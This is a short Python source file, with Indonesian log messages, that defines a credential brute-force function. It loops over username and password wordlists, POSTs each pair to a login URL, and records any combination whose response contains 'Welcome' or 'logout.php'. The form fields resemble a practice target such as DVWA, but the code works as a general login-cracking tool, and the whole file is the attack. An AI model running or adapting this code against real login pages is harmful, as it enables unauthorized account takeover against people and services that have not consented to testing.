import requests
from utils.log_utils import log_info, log_error
from utils.file_utils import log_success

def crack_login(url, userlist_path, passlist_path):
    try:
        with open(userlist_path, "r") as f:
            usernames = f.read().splitlines()
        with open(passlist_path, "r") as f:
            passwords = f.read().splitlines()
    except Exception as e:
        log_error(f"Gagal membaca wordlist: {e}")
        return

    for username in usernames:
        for password in passwords:
            payload = {
                'username': username,
                'password': password,
                'Login': 'Login'
            }

            session = requests.Session()
            response = session.post(url, data=payload)

            if "Welcome" in response.text or "logout.php" in response.text:
                found = f"LOGIN - URL: {url} | Username: {username} | Password: {password}"
                log_info(f"[✓] Ditemukan! Username: {username} | Password: {password}")
                log_success(found)
                return
            else:
                log_info(f"[x] Coba: {username} | {password}")

    log_error("Tidak ditemukan kombinasi yang cocok.")

